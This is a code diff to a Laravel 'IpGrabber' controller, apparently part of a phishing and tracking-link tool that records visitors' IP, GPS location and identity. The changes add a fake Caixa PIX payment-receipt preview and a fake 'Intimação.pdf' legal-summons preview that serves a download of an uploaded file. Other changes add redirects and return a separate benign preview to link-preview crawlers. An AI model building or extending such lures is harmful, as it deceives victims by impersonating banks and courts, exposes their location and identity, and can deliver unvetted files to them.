@@ -29,7 +29,10 @@ class IpGrabberController extends Controller
 
         if ($ipGrabber) {
             $this->preencherPreviewDoPixBradescoSeNecessario($ipGrabber);
+            $this->preencherPreviewDoPixCaixaSeNecessario($ipGrabber);
             $this->preencherPreviewDaNoticiaSeNecessario($ipGrabber);
+            $this->preencherPreviewDaIntimacaoSeNecessario($ipGrabber);
+            $ipGrabber->refresh();
         }
 
         $mensagem = $ipGrabber?->mensagem ?? IpGrabber::DEFAULT_CLICK_MESSAGE;
@@ -44,13 +47,14 @@ class IpGrabberController extends Controller
         $captureGps = (bool) $ipGrabber?->capture_gps;
         $captureAlvo = (bool) $ipGrabber?->capture_alvo;
         $captureIdentity = (bool) $ipGrabber?->capture_identity;
-        $redirectUrl = $this->deveRedirecionarParaNoticia($request, $ipGrabber) ? $ipGrabber->noticia_url : null;
+        $redirectUrl = $this->resolverUrlDeRedirecionamento($request, $ipGrabber);
+        $downloadUrl = $this->resolverUrlDeDownload($request, $ipGrabber);
 
         if ($this->requisicaoDePreviewOuPrefetch($request)) {
             return view('pixel.preview', compact('ogTitulo', 'ogDescricao', 'ogImagem', 'ogUrl'));
         }
 
-        return view('pixel.landing', compact('mensagem', 'token', 'accessUuid', 'captureGps', 'captureAlvo', 'captureIdentity', 'redirectUrl', 'ogTitulo', 'ogDescricao', 'ogImagem', 'ogUrl'));
+        return view('pixel.landing', compact('mensagem', 'token', 'accessUuid', 'captureGps', 'captureAlvo', 'captureIdentity', 'redirectUrl', 'downloadUrl', 'ogTitulo', 'ogDescricao', 'ogImagem', 'ogUrl'));
     }
 
     public function gif(Request $request, string $token): Response
@@ -251,6 +255,27 @@ class IpGrabberController extends Controller
         }
     }
 
+    private function preencherPreviewDaIntimacaoSeNecessario(IpGrabber $ipGrabber): void
+    {
+        if ($ipGrabber->preview_tipo !== 'intimacao') {
+            return;
+        }
+
+        $updates = [];
+
+        if (! $ipGrabber->og_titulo) {
+            $updates['og_titulo'] = 'Intimação.pdf';
+        }
+
+        if (! $ipGrabber->og_descricao) {
+            $updates['og_descricao'] = 'Clique para visualizar e baixar o documento oficial.';
+        }
+
+        if ($updates) {
+            $ipGrabber->forceFill($updates)->save();
+        }
+    }
+
     private function preencherPreviewDoPixBradescoSeNecessario(IpGrabber $ipGrabber): void
     {
         if ($ipGrabber->preview_tipo !== 'pix_bradesco' || $ipGrabber->og_imagem_upload) {
@@ -269,6 +294,27 @@ class IpGrabberController extends Controller
             $ipGrabber->forceFill(['og_imagem_upload' => $dest])->save();
             $ipGrabber->refresh();
             return;
+        }
+    }
+
+    private function preencherPreviewDoPixCaixaSeNecessario(IpGrabber $ipGrabber): void
+    {
+        if ($ipGrabber->preview_tipo !== 'pix_caixa') {
+            return;
+        }
+
+        $updates = [];
+
+        if (! $ipGrabber->og_titulo) {
+            $updates['og_titulo'] = 'Comprovante PIX Caixa';
+        }
+
+        if (! $ipGrabber->og_descricao) {
+            $updates['og_descricao'] = 'Clique para abrir seu comprovante.';
+        }
+
+        if ($updates) {
+            $ipGrabber->forceFill($updates)->save();
         }
     }
 
@@ -422,6 +468,58 @@ class IpGrabberController extends Controller
         }
 
         return ! $this->requisicaoDePreviewOuPrefetch($request);
+    }
+
+    private function resolverUrlDeDownload(Request $request, ?IpGrabber $ipGrabber): ?string
+    {
+        if (! $ipGrabber || $ipGrabber->preview_tipo !== 'intimacao' || ! $ipGrabber->intimacao_arquivo) {
+            return null;
+        }
+
+        if ($this->modoPreviewManual($request) || ! $request->isMethod('GET')) {
+            return null;
+        }
+
+        if ($this->requisicaoDePreviewOuPrefetch($request)) {
+            return null;
+        }
+
+        return route('pixel.intimacao.download', $ipGrabber->token);
+    }
+
+    public function downloadIntimacao(string $token): \Symfony\Component\HttpFoundation\StreamedResponse|\Illuminate\Http\Response
+    {
+        $ipGrabber = IpGrabber::where('token', $token)
+            ->where('preview_tipo', 'intimacao')
+            ->firstOrFail();
+
+        abort_unless($ipGrabber->intimacao_arquivo, 404);
+        abort_unless(Storage::disk('public')->exists($ipGrabber->intimacao_arquivo), 404);
+
+        $filename = 'intimacao-' . $token . '.' . pathinfo($ipGrabber->intimacao_arquivo, PATHINFO_EXTENSION);
+
+        return Storage::disk('public')->download($ipGrabber->intimacao_arquivo, $filename);
+    }
+
+    private function resolverUrlDeRedirecionamento(Request $request, ?IpGrabber $ipGrabber): ?string
+    {
+        if ($this->deveRedirecionarParaNoticia($request, $ipGrabber)) {
+            return $ipGrabber->noticia_url;
+        }
+
+        if (! $ipGrabber || ! $ipGrabber->redirect_url) {
+            return null;
+        }
+
+        if ($this->modoPreviewManual($request) || ! $request->isMethod('GET')) {
+            return null;
+        }
+
+        if ($this->requisicaoDePreviewOuPrefetch($request)) {
+            return null;
+        }
+
+        return $ipGrabber->redirect_url;
     }
 
     private function requisicaoDePreviewOuPrefetch(Request $request): bool
